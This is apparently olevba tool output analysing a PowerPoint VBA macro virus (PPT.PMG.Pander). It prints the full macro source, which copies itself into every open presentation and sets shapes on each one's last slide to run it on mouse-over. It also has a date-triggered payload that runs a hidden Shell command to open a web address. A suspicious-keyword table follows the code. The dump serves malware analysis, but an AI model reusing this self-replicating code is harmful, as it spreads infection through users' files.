olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.PMG-2274ded014d1d0ee91f3056ca37f66882ed68e6c
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSPPoint.PMG-2274ded014d1d0ee91f3056ca37f66882ed68e6c 
in file: Virus.MSPPoint.PMG-2274ded014d1d0ee91f3056ca37f66882ed68e6c - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PMG(Pander)
On Error Resume Next
Set MyPander = ActivePresentation.VBProject.VBComponents("Pander").CodeModule
ThisPander = MyPander.CountOfLines + 1: PanderFiles = MyPander.Lines(1, ThisPander)
For Each ThisPander In Presentations
If ThisPander.VBProject.VBComponents(MyPander).Name <> MyPander Then
ThisPander.VBProject.VBComponents.Add(1).Name = MyPander
ThisPander.VBProject.VBComponents(MyPander).CodeModule.InsertLines 1, PanderFiles
For Each LittlePander In ThisPander.Slides(ThisPander.Slides.Count).Shapes
If LittlePander.ActionSettings(ppMouseOver).Action = 0 Then _
LittlePander.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
LittlePander.ActionSettings(ppMouseOver).Run ="PMG"
Next: End If: Next
On Error GoTo Exit_Payload
If Day(Now()) = 05 then
Application.Caption = "Microslop PowerPoint"
Msgbox "Metaphase & NoMercy!!!", 0, "PPT.PMG.Pander"
Shell "start http://www.coderz.net/", vbHide
End If
Exit_Payload:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.coderz.ne|URL                                          |
|          |t/                  |                                             |
+----------+--------------------+---------------------------------------------+

